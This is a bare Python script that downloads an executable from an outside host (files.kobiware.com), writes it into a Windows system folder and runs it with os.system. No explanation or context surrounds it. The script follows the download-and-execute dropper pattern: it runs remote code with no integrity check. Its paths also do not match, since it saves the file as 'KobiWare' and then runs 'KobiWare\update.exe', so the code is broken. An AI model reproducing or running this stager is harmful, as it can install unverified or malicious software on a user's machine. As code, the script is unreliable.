import requests
import os

open(r"C:\Windows\tracing\KobiWare", "wb").write(requests.get("https://files.kobiware.com/update.exe").content)
os.system(r"C:\Windows\tracing\KobiWare\update.exe")